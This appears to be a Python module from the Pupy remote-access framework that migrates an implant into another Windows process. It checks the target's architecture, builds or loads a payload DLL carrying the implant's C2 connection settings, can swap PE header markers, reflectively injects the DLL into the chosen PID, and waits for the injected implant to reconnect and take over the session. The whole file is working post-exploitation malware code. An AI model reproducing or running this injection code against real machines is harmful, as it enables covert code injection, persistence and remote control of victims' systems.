# -*- coding: utf-8 -*-

from __future__ import absolute_import
from __future__ import division
from __future__ import print_function
from __future__ import unicode_literals

import sys
import time

from pupylib.cli import pupygen

from pupylib.payloads.dependencies import Target

if sys.version_info.major > 2:
    xrange = range


def has_proc_migrated(client, pid):
    for c in client.pupsrv.clients:
        if int(c.desc['pid']) != pid:
            continue

        for field in ('hostname', 'macaddr'):
            if c.desc.get(field) == client.desc.get(field):
                return c

    return None


def migrate(
    module, pid, keep=False, timeout=30, bindPort=None,
        debug=False, from_payload=None):
    '''
    - bindPort: The port used for listening on the target WHEN the current
                launcher uses a BIND connection. When the current launcher
                uses a BIND connection, this session is kept even if
                keep==False. When bindPort!=None and the current launcher
                uses a REVERSE connection (e.g. connect, auto_proxy),
                bindPort is not used in this function
    '''
    module.client.load_package('pupwinutils.processes')
    isProcess64bits = False
    # If current launcher uses a BIND connection, isBindConnection == True
    isBindConnection = False

    pid = int(pid)

    module.success('looking for process {} architecture ...'.format(pid))

    is_process_64 = module.client.remote(
        'pupwinutils.processes', 'is_process_64'
    )

    target = None

    if is_process_64(pid):
        isProcess64bits = True
        module.info('Process is 64 bits')
        target = Target(
            module.client.target.pyver,
            platform=(
                'windows', 'amd64'
            ),
            debug=debug
        )
    else:
        target = Target(
            module.client.target.pyver,
            platform=(
                'windows', 'x86'
            ),
            debug=debug
        )
        module.info("process is 32 bits")

    dllbuff = None
    if from_payload:
        with open(from_payload, 'rb') as payload:
            dllbuff = payload.read()

        keep = True
        module.success('Precompiled payload: {}'.format(from_payload))
    else:
        conf = module.client.get_conf()

        # Manage when current launcher uses a BIND connection
        # (and not a REVERSE connection)

        if module.client.desc['launcher'] not in ('connect', 'auto_proxy'):
            keep = True
            module.warning('Enable keep (forced)')

        if module.client.desc['launcher'] == "bind":
            isBindConnection = True
            module.success('The current launcher uses a bind connection')
            module.success(
                'The bind port {0} is defined in DLL configuration'.format(
                    bindPort)
            )

            conf['launcher_args'][
                conf['launcher_args'].index("--port")+1] = str(bindPort)

        dllbuff, filename, _ = pupygen.generate_binary_from_template(
            module.log, conf, target, shared=True
        )

        module.success('Template: {}'.format(filename))

    if not isinstance(dllbuff, (bytes, bytearray)):
        raise ValueError(
            'Template expected to be bytes object. Got ({}) instead'.format(
                type(dllbuff)
            )
        )

    if module.config.getboolean('pupyd', 'alt_header'):
        module.warning('Using ALT markers')
        # Use ALT markers to simplify debugging
        for offt in xrange(0, 1024, 4):
            if dllbuff[offt:offt+4] == b'PE\0\0':
                dllbuff = b''.join([
                    b'HE',
                    dllbuff[2:offt],
                    b'\xb5\x00[\xb1',
                    dllbuff[offt+4:]
                ])

    dllbuff = bytes(dllbuff)

    module.success(
        'Injecting DLL into the target process {} ...'.format(pid)
    )

    reflective_inject_dll = module.client.remote(
        'pupy', 'reflective_inject_dll', False
    )

    reflective_inject_dll(
        int(pid), dllbuff, bool(isProcess64bits)
    )

    module.success('DLL injected')

    if keep or isBindConnection:
        return

    module.success('Waiting for a connection from the DLL ...')
    time_end = time.time() + timeout
    c = False
    while True:
        c = has_proc_migrated(module.client, pid)
        if c:
            module.success('Got a connection from migrated DLL')
            c.pupsrv.move_id(c, module.client)
            module.client.conn.exit()
            module.success('Migration completed')
            break

        elif time.time() > time_end:
            module.error('Migration timed out')
            break

        time.sleep(0.5)
